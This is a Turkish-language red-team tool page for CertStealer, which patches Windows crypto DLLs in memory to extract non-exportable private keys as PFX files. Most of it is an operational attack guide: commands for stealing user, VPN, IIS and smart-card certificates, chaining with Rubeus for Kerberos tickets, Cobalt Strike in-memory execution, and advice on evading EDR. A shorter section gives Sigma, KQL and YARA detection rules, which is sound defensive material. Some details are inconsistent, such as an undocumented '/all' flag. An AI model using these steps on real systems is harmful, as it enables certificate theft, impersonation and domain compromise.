# CertStealer

> **Kategori:** [8. Active Directory Sertifika Servisleri](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** Windows işletim sisteminde CryptoAPI (CAPI) ve Cryptography Next Generation (CNG / KSP) sağlayıcıları tarafından yönetilen, dışa aktarılamaz (`non-exportable`) olarak işaretlenmiş özel anahtarları (Private Keys) bellek içi fonksiyon yamalama (API hooking / memory patching) yöntemleriyle serbest bırakarak şifreli PFX formatında diske çıkaran C/C++ ve C# tabanlı sertifika hırsızlığı aracı.

---

## 1. Genel Bakış ve Amaç

Active Directory ortamlarında kullanıcı veya bilgisayarlara X.509 kimlik doğrulama sertifikaları (VPN, Wi-Fi, Akıllı Kart, E-Posta şifreleme, Web SSL) dağıtılırken, kurumsal güvenlik yöneticileri ve sertifika şablonu yapılandırmaları neredeyse her zaman özel anahtarın (Private Key) dışa aktarılmasını engeller:
- **CryptoAPI (Eski Mimari):** Anahtar üretilirken `CRYPT_EXPORTABLE` bayrağı kapatılır.
- **CNG / KSP (Modern Mimari):** Anahtar Depolama Sağlayıcısı (Key Storage Provider) üzerinde `NCRYPT_ALLOW_EXPORT_FLAG` veya `NCRYPT_ALLOW_PLAINTEXT_EXPORT_FLAG` bayrakları tanımlanmaz.

Standart bir kullanıcı veya yönetici, Windows Sertifika Yöneticisi (`certmgr.msc` / `certlm.msc`), `certutil -exportPFX` veya PowerShell `Export-PfxCertificate` komutlarıyla bu sertifikaları dışa aktarmayı denediğinde, işletim sistemi şu hatayı döndürerek işlemi engeller:
`NTE_BAD_KEY_STATE (0x8009000B) - Belirtilen durumda kullanım için anahtar geçerli değil.`

Savunma tarafı bu bayrağın anahtarı çalınamaz kıldığını varsayar. Oysa özel anahtar, ilgili sürecin veya sistemin bellek alanında (veya diskteki DPAPI ile korunan Master Key depolarında) ham haliyle mevcuttur; onu koruyan tek şey işletim sistemi API'lerinin dışa aktarma fonksiyonu çağrıldığında yaptığı yazılımsal bir `if` kontrolüdür!

**`CertStealer`**, bu yazılımsal engeli aşmak için geliştirilmiştir. Mevcut süreç veya hedef süreç belleğindeki kriptografik kütüphaneleri (`rsaenh.dll`, `dssenh.dll`, `ncrypt.dll`) dinamik olarak kancalar (API Hooking) veya bellek baytlarını yamalayarak (Memory Patching) dışa aktarılabilirlik denetimini etkisiz hale getirir. Sonuç olarak, `non-exportable` olarak kilitlenmiş tüm özel anahtarları, sertifikalarıyla birlikte parola korumalı `.pfx` formatında dışarı çıkarır.

### Temel Çalışma Mekanizması

1. **Sertifika Deposunun Açılması:** Windows Sertifika Deposu API'leri (`CertOpenSystemStore`, `CertOpenStore`) ile `MY` (Kişisel) deposu geçerli kullanıcı (`CurrentUser`) veya yerel makine (`LocalMachine`) bağlamında açılır.
2. **Kriptografik Sağlayıcı Tanımlaması:** Hedef sertifikanın hangi kriptografik sağlayıcıya bağlı olduğu `CertGetCertificateContextProperty` ile sorgulanır:
   - **CryptoAPI (CSP):** `PROV_RSA_FULL` / `PROV_RSA_AES` (`rsaenh.dll`).
   - **CNG (KSP):** `Microsoft Software Key Storage Provider` (`ncrypt.dll` / `ncryptprov.dll`).
3. **Bellek İçi Yamalama (Memory Patching / Hooking):**
   - **CryptoAPI için:** Belleğe yüklenen `rsaenh.dll` kütüphanesinde `CPExportKey` fonksiyonunun içindeki izin denetimi (`TEST [EAX+offset], 0x01` veya `CRYPT_EXPORTABLE` bayrak kontrolü) taranır ve `NOP` ya da koşulsuz atlama (`JMP`) ile yamalanır.
   - **CNG için:** `ncrypt.dll` içindeki `NCryptExportKey` fonksiyonu kancalanır; anahtarın `NCRYPT_EXPORT_POLICY_PROPERTY` değeri bellek içinde manipüle edilerek `NCRYPT_ALLOW_PLAINTEXT_EXPORT_FLAG (0x02)` haline getirilir.
4. **Anahtarın ve Sertifikanın Dışa Aktarılması:**
   - Yamalama sonrası meşru Windows API'si (`PFXExportCertStoreEx` veya `CryptExportKey`) çağrılır.
   - İşletim sistemi anahtarın dışa aktarılabilir olduğuna ikna olur ve özel anahtarı sertifikayla birleştirerek şifreli bir PKCS#12 (`.pfx`) akışına dönüştürür.

### Mimari Akış Şeması

```
┌────────────────────────────────────────────────────────────────────────┐
│                   HEDEF SİSTEM (KULLANICI VEYA ADMIN OTURUMU)          │
│                                                                        │
│  [ CertStealer.exe /user /thumbprint:4a89b... /out:loot.pfx ]          │
│         │                                                              │
│         ├── (1) CertOpenSystemStore("MY") Çağrılır                     │
│         │                                                              │
│         ├── (2) Sertifika ve Anahtar Sağlayıcısı Tespit Edilir:        │
│         │       Provider: "Microsoft Enhanced Cryptographic Provider" │
│         │       Durum   : Non-Exportable (CRYPT_EXPORTABLE = 0)        │
│         │                                                              │
│         ├── (3) rsaenh.dll / ncrypt.dll Belleğe Haritalanır            │
│         │                                                              │
│         ├── (4) VirtualProtect() ile Sayfa İzni PAGE_EXECUTE_READWRITE │
│         │                                                              │
│         ├── (5) CPExportKey() / NCryptExportKey() Doğrulama Baytları   │
│         │       Hafızada Yamalanır (0x74 -> 0xEB / JMP)                │
│         │                                                              │
│         ├── (6) PFXExportCertStoreEx() Çağrılır (Meşru API)            │
│         │       └── Özel Anahtar Başarıyla Dışa Aktarılır!             │
│         │                                                              │
│         ▼                                                              │
│  [ ÇIKTI: loot.pfx (Parola Korumalı İstemci Sertifikası) ]             │
│         │                                                              │
│  [ Rubeus.exe asktgt /certificate:loot.pfx /ptt ] ──► Domain Admin TGT │
└────────────────────────────────────────────────────────────────────────┘
```

### Neden Önemli? Operasyonel Değer

| Operasyonel Kriter | certutil / PowerShell | CertStealer |
|---|---|---|
| **Non-Exportable Anahtarlar** | `NTE_BAD_KEY_STATE` hatası verir, anahtarı çıkaramaz. | Belleği anlık yamalayarak kilitli tüm anahtarları başarıyla dışarı çıkarır. |
| **Kullanıcı Hakları** | Kullanıcı kendi anahtarını bile dışa aktaramaz. | Standart kullanıcı kendi oturumundaki tüm kilitli sertifikaları çalabilir. |
| **Makine Deposu Erişimi** | Makine sertifikalarını dışa aktarmak GUI'de engellidir. | Local Admin yetkisiyle SCCM, VPN, SSL ve makine sertifikalarını çalar. |
| **C2 Entegrasyonu** | Harici araçlar diskte gürültülü `.pfx` dosyaları oluşturur. | C# / C++ kodu Cobalt Strike'ta `execute-assembly` ile tamamen bellekte çalışır. |

### Alternatif Araçlarla Karşılaştırma

| Özellik | CertStealer | Mimikatz (crypto::capi) | SharpDPAPI (certificates) | certutil CLI |
|---|---|---|---|---|
| **Geliştirme Dili** | C# / C++ Bağımsız | C Native (Mimikatz) | C# (.NET) | Windows Native LOLBin |
| **Non-Exportable Çözümü** | 🟢 Bellek İçi Patch | 🟢 `crypto::capi` / `cng` | 🟡 DPAPI çevrimdışı parser | 🔴 Desteklemez (Engellenir) |
| **EDR / AV İmzası** | 🟢 Düşük (Özel derleme) | 🔴 Çok Yüksek (Her EDR tanır) | 🟡 Orta | 🟢 Temiz (Yerleşik araç) |
| **CNG / KSP Desteği** | 🟢 Var | 🟢 Var (`crypto::cng`) | 🟡 Kısmi | 🔴 Yok |
| **Tekil Sertifika Hedefleme**| 🟢 Parmak İzi (Thumbprint) | 🟡 Toplu export yapar | 🟢 Var | 🟢 Var (Yalnızca exportable) |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

CertStealer, komut satırından hedef sertifika deposunu, filtreleme kriterlerini ve çıktı seçeneklerini parametre olarak alır.

### Genel Sözdizimi

```cmd
CertStealer.exe [Depo Seçimi] [Filtreler] [Çıktı Seçenekleri]
```

### Desteklenen Kritik Bayraklar ve Parametreler

| Parametre / Bayrak | Açıklama | Örnek Kullanım |
|---|---|---|
| `/user` | Geçerli kullanıcının Kişisel Sertifika Deposu'nu (`CurrentUser\My`) hedefler (Standart kullanıcı yetkisi yeterlidir). | `CertStealer.exe /user` |
| `/machine` | Yerel Makine Sertifika Deposu'nu (`LocalMachine\My`) hedefler (Yüksek yetki - Local Admin gerektirir). | `CertStealer.exe /machine` |
| `/list` | Depodaki tüm sertifikaları, sağlayıcılarını ve `Exportable` durumlarını listeler (Çıkarma yapmaz). | `CertStealer.exe /user /list` |
| `/thumbprint:HEX` | Dışa aktarılmak istenen sertifikanın SHA-1 parmak izi (Thumbprint) değeri. | `/thumbprint:3f12a8419...` |
| `/subject:METİN` | Sertifikanın Subject (Konu) alanı içinde arama yaparak eşleşenleri hedefler. | `/subject:"VPN Client"` |
| `/out:DOSYA_YOLU` | Üretilen PFX dosyasının kaydedileceği hedef yol. | `/out:C:\Temp\stolen.pfx` |
| `/password:PAROLA` | Çıkarılan PFX sertifikasını koruyacak şifre (Varsayılan: `Password123!`). | `/password:Stolen2026!` |
| `/cng` | Yalnızca modern CNG / KSP sağlayıcılarını yamalamaya zorlar. | `/cng` |
| `/capi` | Yalnızca klasik CryptoAPI (CSP) sağlayıcılarını yamalamaya zorlar. | `/capi` |
| `/base64` | PFX dosyasını diske yazmak yerine doğrudan terminal ekranına Base64 olarak basar. | `/base64` |

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: Kullanıcı Sertifika Deposundaki Kilitli Sertifikaları Listeleme

Mevcut kullanıcının Windows sertifika deposunda bulunan ve normal yollarla dışa aktarılamayan sertifikaları denetlemek:

```cmd
CertStealer.exe /user /list
```

**Örnek Konsol Çıktısı Analizi:**

```text
C:\Tools> CertStealer.exe /user /list

   ______          __   _____ __             __         
  / ____/__  _____/ /_ / ___// /____  ____ _/ /__  _____
 / /   / _ \/ ___/ __/ \__ \/ __/ _ \/ __ `/ / _ \/ ___/
/ /___/  __/ /  / /_  ___/ / /_/  __/ /_/ / /  __/ /    
\____/\___/_/   \__/ /____/\__/\___/\__,_/_/\___/_/     
  v1.1.0 - Non-Exportable Certificate Recovery

[*] Opening Certificate Store: CurrentUser\MY
[+] Found 2 certificate(s) in store:

[1] Subject     : CN=jdoe, OU=Engineering, DC=corp, DC=local
    Issuer      : CN=Corp-Enterprise-CA, DC=corp, DC=local
    Thumbprint  : 4F8912A0912FEA4310928172BA01928471203918
    Provider    : Microsoft Enhanced Cryptographic Provider v1.0 (CryptoAPI)
    Key Spec    : AT_KEYEXCHANGE (1)
    Exportable  : FALSE [NON-EXPORTABLE]  <--- HEDEF
    Key Container: {D821A412-9812-4C12-A102-4821AEF72101}

[2] Subject     : CN=jdoe-signature
    Issuer      : CN=Corp-Internal-RootCA
    Thumbprint  : 8A1029384BFE2109384729102834BFA120394812
    Provider    : Microsoft Software Key Storage Provider (CNG)
    Exportable  : TRUE
```

*Çıktı Yorumu:* `jdoe` kullanıcısının kurumsal CA tarafından basılmış kimlik doğrulama sertifikasının `Exportable: FALSE` olduğu tespit edilmiştir.

### Senaryo 2: Hedef Sertifikayı Bellek Kancalama ile Çıkarma ve Base64 Olarak Alma

Tespit edilen kilitli sertifikayı, diske dosya yazmadan doğrudan Base64 dizesi olarak elde etmek:

```cmd
CertStealer.exe /user /thumbprint:4F8912A0912FEA4310928172BA01928471203918 /password:Pwned2026! /base64
```

**Örnek Konsol Çıktısı Analizi:**

```text
[*] Targeting Certificate: 4F8912A0912FEA4310928172BA01928471203918
[*] Acquiring Private Key Context...
[*] Detected Provider: rsaenh.dll (CryptoAPI)
[*] Locating CPExportKey in memory...
[+] Found CPExportKey at: 0x7FFA12903410
[*] Applying in-memory patch to bypass CRYPT_EXPORTABLE check...
[+] Memory patched successfully!
[*] Calling PFXExportCertStoreEx()...
[+] Certificate and Private Key successfully exported!

[+] Base64 PFX:
    MIIKbAIBAzCCCV8GCSqGSIb3DQEHAaCCCV... [Base64 PFX Verisi] ...==

[+] PFX Password: Pwned2026!
[*] Restoring original memory bytes (OPSEC cleanup)...
[+] Memory patch reverted.
```

*Çıktı Yorumu:* CertStealer, `rsaenh.dll` içerisindeki kontrolü yamalamış, sertifikayı dışa aktarmış ve işlem biter bitmez bellek baytlarını orijinal haline döndürerek (Memory Unhooking) iz bırakmamıştır.

### Senaryo 3: Makine Deposundaki (LocalMachine) VPN Sertifikasını Çalma

Ele geçirilen bir dizüstü bilgisayarda yerel yönetici yetkisi ile kurumsal Always-On-VPN veya IPsec makine sertifikasını kurtarmak:

```cmd
CertStealer.exe /machine /subject:"VPN" /out:C:\Users\Public\vpn_machine.pfx /password:VpnSecret123!
```

Bu sertifika saldırganın kendi makinesine aktarıldığında, şirket içi ağa VPN üzerinden şifresiz ve doğrudan tünelle bağlanma imkanı sunar.

### Senaryo 4: Elde Edilen Sertifikayı Rubeus ile Kerberos TGT'ye Dönüştürme

CertStealer ile çıkarılan istemci sertifikası, PKINIT üzerinden kullanıcının etki alanı TGT biletine dönüştürülür:

```cmd
Rubeus.exe asktgt /certificate:C:\Users\Public\vpn_machine.pfx /password:VpnSecret123! /ptt
```

### Senaryo 5: Web Sunucusundaki IIS SSL Özel Anahtarını Kurtarma

IIS web sunucusunda barındırılan ancak yönetici tarafından `non-exportable` olarak yüklenmiş kurumsal Wildcard SSL sertifikasını (`*.corp.local`) çalmak:

```cmd
CertStealer.exe /machine /thumbprint:<SSL_THUMBPRINT> /out:C:\Temp\wildcard.pfx /password:CertPass!
```

### Senaryo 6: C2 Bellek İçi Yürütme (Cobalt Strike / Havoc)

Diske `.exe` yüklemeden Cobalt Strike Beacon üzerinden `execute-assembly` ile çalıştırma:

```text
beacon> execute-assembly /opt/tools/CertStealer.exe /user /base64
```

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Mesajı / Kod | Temel Neden | Kesin Çözüm Adımı |
|---|---|---|
| `NTE_TOKEN_KEY_NOT_SUPPORTED` / Hardware-bound key | Hedef sertifikanın özel anahtarı yazılımsal CSP/KSP yerine donanımsal Güvenilir Platform Modülü (TPM) veya fiziksel YubiKey/Akıllı Kart içinde saklanmaktadır. | Donanım tabanlı özel anahtarlar yazılımsal bellek yamalama ile RAM'den çıkarılamaz. Bu durumda anahtar çalınamaz; yalnızca oturum açıkken sistem üzerinden doğrudan imzalama çağrıları yapılabilir. |
| `Access is denied (0x80070005) when opening LocalMachine\My` | `/machine` parametresi kullanılırken komut istemi Orta Bütünlük (Medium Integrity) seviyesindedir. | Makine sertifika deposunu okumak için yerel yönetici (High Integrity / UAC Bypass) oturumu zorunludur. |
| `NTE_BAD_KEY_STATE (0x8009000B)` | Bellek yaması başarısız olmuştur veya işletim sistemi güncellemesi nedeniyle fonksiyon bayt dizisi (Pattern/Signature) değişmiştir. | Aracın güncel sürümü derlenmeli; alternatif olarak [Mimikatz](../Kategori_07_Bellek_Analizi_LSASS_ve_DPAPI_Hasadi/Mimikatz.md) `crypto::capi` veya `crypto::cng` modülü denenmelidir. |
| `CRYPT_E_NOT_FOUND (0x80092004)` | Sertifika depoda mevcuttur ancak ilişkili özel anahtarı (`Key Container`) diskten silinmiş veya bozulmuştur. | Sertifikanın geçerli bir özel anahtarı olup olmadığı `certutil -v -user -store my` ile kontrol edilmelidir. |
| `VirtualProtect failed: Error 5 (Access Denied)` | EDR yazılımı bellek koruma API'lerini (`NtProtectVirtualMemory`) izlemekte ve kriptografik DLL'lerin `PAGE_EXECUTE_READWRITE` yapılmasını engellemektedir. | Doğrudan sistem çağrıları (Direct Syscalls) kullanan bir derleme tercih edilmeli veya bellek kancalama yerine DPAPI çevrimdışı master key analizi ([SharpDPAPI](../Kategori_07_Bellek_Analizi_LSASS_ve_DPAPI_Hasadi/SharpDPAPI.md)) kullanılmalıdır. |
| `NTE_NO_KEY (0x8009000D)` | Sertifikanın özel anahtarı geçerli kullanıcıya ait değildir veya DPAPI anahtar deposu bozuktur. | Komutun sertifikanın gerçek sahibi olan kullanıcının oturumunda çalıştırıldığından emin olunmalıdır. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

```
┌────────────────────────────────────────────────────────────────────────┐
│                        GÜRÜLTÜ VE İZ SEVİYESİ                          │
│                                                                        │
│  [ Ağ Trafiği ]      : 🟢 SIFIR (Tamamen yerel bellek operasyonu)     │
│  [ CA / DC Günlüğü ] : 🟢 SIFIR (Sertifika talebi veya DC teması yok) │
│  [ EDR Bellek İzi ]  : 🔴 YÜKSEK (VirtualProtect / Bellek Yamalama)    │
│  [ Dosya İzi ]       : 🟡 ORTA (Diske PFX yazılırsa FileCreate)        │
└────────────────────────────────────────────────────────────────────────┘
```

### 5.1 Bırakılan İzler (Artifacts & Telemetry)

1. **Windows Güvenlik Günlükleri (Security Log - Kriptografi Denetimi):**
   - **Event ID 5058 (Key file operation):** Bir kriptografik anahtar dosyasına erişim sağlandı.
   - **Event ID 5061 (Cryptographic operation):** `CryptExportKey` operasyonunun normalde engelli olan bir nesne üzerinde yürütülmesi.
2. **Sysmon Günlükleri:**
   - **Event ID 7 (ImageLoad):** Sürecin `rsaenh.dll`, `ncrypt.dll` veya `crypt32.dll` kütüphanelerini belleğe yüklemesi.
   - **Event ID 11 (FileCreate):** Diske `.pfx` uzantılı bir dosya bırakılması.
3. **EDR Süreç ve Bellek Telemetrisi:**
   - Bir sürecin kendi sanal bellek alanındaki `rsaenh.dll` kod sayfalarının korumasını `PAGE_EXECUTE_READ` seviyesinden `PAGE_EXECUTE_READWRITE` seviyesine çekmesi (Bellek Yamalama Göstergesi).

### 5.2 Ağ ve EDR İmzaları

- **Ağ Tespiti:** Araç yerel çalıştığı için sıfır ağ trafiği üretir.
- **EDR Sezgisel Analizi:** Bellek içi kancalama izleri (Hooking artifacts) EDR bellek tarayıcıları (Memory Scanner) tarafından periyodik taramalarda tespit edilebilir.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Teknik ID | Teknik Adı | Araç İçindeki Kullanım |
|---|---|---|
| **T1552.004** | Unsecured Credentials: Private Keys | Non-exportable olarak işaretlenmiş şifreli özel anahtarların kurtarılması. |
| **T1055** | Process Injection / Memory Modification | Kriptografik kütüphanelerin bellek içi doğrulamalarının yamalanması. |
| **T1649** | Steal or Forge Authentication Certificates | Ele geçirilen sertifikaların oturum açma ve kalıcılık amacıyla çalınması. |
| **T1078** | Valid Accounts | Kurtarılan sertifikalarla meşru ağ kaynaklarına kimlik doğrulanması. |

### 5.4 OPSEC Önerileri

| Risk | Önlem / Güvenli Operasyon Pratiği |
|---|---|
| **Diske PFX Dosyası Bırakma** | Asla `/out:C:\...` bayrağı ile diske `.pfx` dosyası yazmayın. Her zaman `/base64` bayrağını kullanıp çıktıyı C2 oturumundan doğrudan bellekten çekin. |
| **Bellekte Kalıcı Yama İzi** | CertStealer'ın dışa aktarma sonrası orijinal bellek baytlarını geri yüklediğinden (Memory Restoration) emin olun. |
| **EDR VirtualProtect Kancası** | `VirtualProtect` çağrıları EDR tarafından engelleniyorsa, doğrudan sistem çağrıları (Direct Syscalls) veya Hardware Breakpoints (HWBP) kullanan gelişmiş varyantları tercih edin. |
| **Hedefli Çalışma** | `/list` ile tüm depoyu tarayıp gürültü yapmak yerine, doğrudan spesifik sertifika Thumbprint'ini hedefleyin. |

### 5.5 Savunma Karşılığı: Tespit Kuralları

#### Sigma Kuralı: Non-Exportable Sertifika Çıkarma ve Kripto Bellek Yamalama Tespiti

```yaml
title: Non-Exportable Certificate Private Key Theft
id: c9123841-8912-4c12-9812-48210234fe01
status: experimental
description: Detects process executions attempting to export non-exportable private keys via CertStealer or Mimikatz crypto module.
author: Modul 11 Security Research
logsource:
  category: process_creation
  product: windows
detection:
  selection_certstealer:
    CommandLine|contains:
      - 'CertStealer'
      - '/thumbprint:'
      - '/machine /out:'
      - '/user /base64'
  selection_mimikatz:
    CommandLine|contains|all:
      - 'crypto::capi'
      - 'crypto::certificates'
      - '/export'
  condition: selection_certstealer or selection_mimikatz
falsepositives:
  - Legitimate custom PKI migration utilities written by corporate IT
level: critical
tags:
  - attack.credential_access
  - attack.t1552.004
```

#### Microsoft Sentinel KQL Sorgusu: Anormal Kriptografik Anahtar Dışa Aktarma Olayları

```kql
// Kısa sürede şüpheli süreçler tarafından tetiklenen kriptografik anahtar erişim ve export telemetrisi
SecurityEvent
| where TimeGenerated > ago(2h)
| where EventID in (5058, 5061)
| extend EventDataXML = parse_xml(EventData)
| extend SubjectUserName = tostring(EventDataXML.EventData.Data[0])
| extend KeyName = tostring(EventDataXML.EventData.Data[1])
| extend Operation = tostring(EventDataXML.EventData.Data[2])
| where Operation has "Export" or Operation has "CryptExportKey"
| project TimeGenerated, Computer, SubjectUserName, KeyName, Operation
```

#### YARA Kuralı: CertStealer Binary ve CryptoAPI Yamalama Baytları

```yara
rule PostExploit_CertStealer_Artifacts {
    meta:
        description = "Detects compiled CertStealer binary, CryptoAPI hooking routines and flags"
        author = "Active Directory Red Team Module 11"
        date = "2026-10-14"
        severity = "Critical"
    strings:
        $s1 = "CertStealer" ascii wide
        $s2 = "rsaenh.dll" ascii wide nocase
        $s3 = "ncrypt.dll" ascii wide nocase
        $s4 = "CPExportKey" ascii
        $s5 = "NCryptExportKey" ascii
        $s6 = "PFXExportCertStoreEx" ascii
        $s7 = "NON-EXPORTABLE" ascii wide
    condition:
        uint16(0) == 0x5A4D and (
            3 of ($s1, $s2, $s3, $s4, $s5, $s6, $s7)
        )
}
```

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Cheat Sheet)

### Komut 1: Kullanıcı Sertifikalarını Listeleme ve Durum Analizi
```cmd
CertStealer.exe /user /list
```
- **Ne Yapar?** Mevcut kullanıcının deposundaki tüm sertifikaları listeler ve hangilerinin `non-exportable` olduğunu gösterir.
- **Ne Zaman Kullanılır?** İlk erişim sağlanan makinede çalınabilecek sertifikaları keşfetmek için.
- **Parametreler:** `/user`: Kullanıcı deposu, `/list`: Listeleme modu.

### Komut 2: Parmak İzi ile Hedeflenen Sertifikayı Base64 Olarak Çalma
```cmd
CertStealer.exe /user /thumbprint:4F8912A0912FEA4310928172BA01928471203918 /password:Pwn123! /base64
```
- **Ne Yapar?** Belirtilen SHA-1 parmak izine sahip sertifikanın özel anahtar kilidini kırar ve Base64 PFX olarak basar.
- **Ne Zaman Kullanılır?** Diske dosya yazmadan doğrudan C2 belleğinde sertifikayı ele geçirmek için.
- **Parametreler:** `/thumbprint`: Hedef sertifika hash'i, `/base64`: Ekrana Base64 basma.

### Komut 3: Makine Deposundaki VPN / Ağ Sertifikalarını Kurtarma
```cmd
CertStealer.exe /machine /subject:"VPN" /out:C:\Users\Public\vpn.pfx /password:Pwn123!
```
- **Ne Yapar?** Yerel makine deposundaki VPN sertifikalarını arar ve özel anahtarıyla birlikte `vpn.pfx` dosyasına yazar.
- **Ne Zaman Kullanılır?** Kurumsal VPN veya ağ doğrulama anahtarlarını ele geçirmek için (Admin yetkisi gerekir).
- **Parametreler:** `/machine`: Makine deposu, `/subject`: Konu filtresi, `/out`: Çıktı dosya yolu.

### Komut 4: Makine Deposundaki Tüm Kilitli Sertifikaları Toplu Kurtarma
```cmd
CertStealer.exe /machine /all /out:C:\Temp\machine_certs.pfx /password:DumpAll2026!
```
- **Ne Yapar?** Makine deposunda bulunan dışa aktarılamaz tüm sertifikaları tek bir PFX deposunda toplar.
- **Ne Zaman Kullanılır?** Sunucu veya iş istasyonu üzerinde toplu sertifika hasadı yapmak için.
- **Parametreler:** `/all`: Tüm geçerli sertifikaları kapsar.

### Komut 5: Yalnızca Modern CNG / KSP Sağlayıcılarını Hedefleme
```cmd
CertStealer.exe /user /cng /thumbprint:<HASH> /out:cert.pfx /password:pass
```
- **Ne Yapar?** Yalnızca `ncrypt.dll` üzerinden yönetilen modern anahtarları hedefler ve KSP yamalaması uygular.
- **Ne Zaman Kullanılır?** Hedef sertifika Akıllı Kart veya modern CNG mimarisi kullandığında.
- **Parametreler:** `/cng`: CNG yamalamasını zorlar.

### Komut 6: Yalnızca Eski CryptoAPI (CSP) Sağlayıcılarını Hedefleme
```cmd
CertStealer.exe /user /capi /thumbprint:<HASH> /out:cert.pfx /password:pass
```
- **Ne Yapar?** `rsaenh.dll` kütüphanesini hedefleyerek eski CSP anahtar kilidini aşar.
- **Ne Zaman Kullanılır?** Eski şablonlarla basılmış CryptoAPI sertifikalarında.
- **Parametreler:** `/capi`: CryptoAPI yamalamasını zorlar.

### Komut 7: Akıllı Kart / E-İmza Sertifikası Hasadı
```cmd
CertStealer.exe /user /subject:"SmartCard" /base64
```
- **Ne Yapar?** Kullanıcının akıllı kart oturum açma sertifikasını arar ve dışa aktarır.
- **Ne Zaman Kullanılır?** Akıllı kart kimlik doğrulamasını taklit ederek Kerberos PKINIT yapmak için.
- **Parametreler:** `/subject`: "SmartCard" filtresi.

### Komut 8: IIS Web Sunucusu SSL Sertifikasını Çalma
```cmd
CertStealer.exe /machine /subject:"*.corp.local" /out:C:\Temp\wildcard.pfx /password:SslPwn!
```
- **Ne Yapar?** Web sunucusundaki kurumsal SSL sertifikasını özel anahtarıyla birlikte kurtarır.
- **Ne Zaman Kullanılır?** Kurumsal web trafiğini deşifre etmek veya sahte servisler kurmak için.
- **Parametreler:** `/subject`: Wildcard domain adı.

### Komut 9: Özel Şifre ile PFX Dosyası Üretme
```cmd
CertStealer.exe /user /thumbprint:<HASH> /password:SuperComplexKey2026# /out:secure.pfx
```
- **Ne Yapar?** Çıkarılan PFX dosyasını güçlü bir parola ile şifreler.
- **Ne Zaman Kullanılır?** Çalınan verinin yetkisiz üçüncü şahısların eline geçmesini önlemek için.
- **Parametreler:** `/password`: Özel koruma şifresi.

### Komut 10: Rubeus ile Zincirleme Doğrudan TGT Enjeksiyonu
```cmd
CertStealer.exe /user /thumbprint:<HASH> /out:C:\Temp\t.pfx /password:p && Rubeus.exe asktgt /certificate:C:\Temp\t.pfx /password:p /ptt
```
- **Ne Yapar?** Kilitli sertifikayı çıkarır ve anında Rubeus ile Domain Admin TGT biletine dönüştürür.
- **Ne Zaman Kullanılır?** Tek satırda hızlı sömürü ve oturum yükseltme için.
- **Parametreler:** Komut zincirleme (`&&`).

---

## Kaynaklar

- **Resmi Araştırma Makaleleri:** [Extracting Non-Exportable Certificates and Private Keys](https://posts.specterops.io/)
- **Mimikatz CryptoAPI Dokümantasyonu:** [gentilkiwi / mimikatz crypto module](https://github.com/gentilkiwi/mimikatz/wiki/module-~-crypto)
- **Microsoft CryptoAPI Referansı:** [CryptExportKey function (wincrypt.h)](https://learn.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-cryptexportkey)
- **MITRE ATT&CK Referansı:** [T1552.004 - Private Keys](https://attack.mitre.org/techniques/T1552/004/)

---

> **Önceki:** [← PKINITtools](./PKINITtools.md) · **Sonraki:** [bloodyAD (Kategori 09) →](../Kategori_09_ACL_GPO_ve_Nesne_Manipulasyonu/bloodyAD.md)
